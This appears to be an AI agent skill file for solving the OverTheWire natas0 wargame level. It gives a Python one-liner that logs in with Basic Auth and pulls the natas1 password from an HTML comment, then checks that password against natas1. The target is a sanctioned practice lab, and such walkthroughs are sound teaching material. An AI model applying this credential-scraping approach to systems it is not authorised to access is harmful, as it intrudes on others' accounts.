---
name: natas-0
description: >-
  Use when solving OverTheWire natas0: given natas0 credentials, fetch the page
  and extract the natas1 password from the HTML comment.
---
# natas0

**Input:** username and password for natas0 (default `natas0` / `natas0`).

**Weakness:** next-level password is left in an HTML comment on the page.

**Network:** run on a host that can reach `natas0.natas.labs.overthewire.org` (the Grok Bot box often cannot; use the user's desktop). On Windows PowerShell use `python` / `curl.exe`, not the `curl` alias.

## Steps

1. Derive the natas1 password from the live page (never hardcode it):

```bash
python -c "import base64,re,urllib.request;u,p='USER','PASS';r=urllib.request.Request('http://natas0.natas.labs.overthewire.org/');r.add_header('Authorization','Basic '+base64.b64encode(f'{u}:{p}'.encode()).decode());h=urllib.request.urlopen(r,timeout=30).read().decode();print(re.search(r'password for natas1 is ([A-Za-z0-9]+)',h).group(1))"
```

Replace `USER` and `PASS` with the natas0 credentials.

2. Print the extracted string — that is the natas1 password.

3. Confirm by GETting `http://natas1.natas.labs.overthewire.org/` with Basic Auth `natas1:<password>` and expecting HTTP 200.
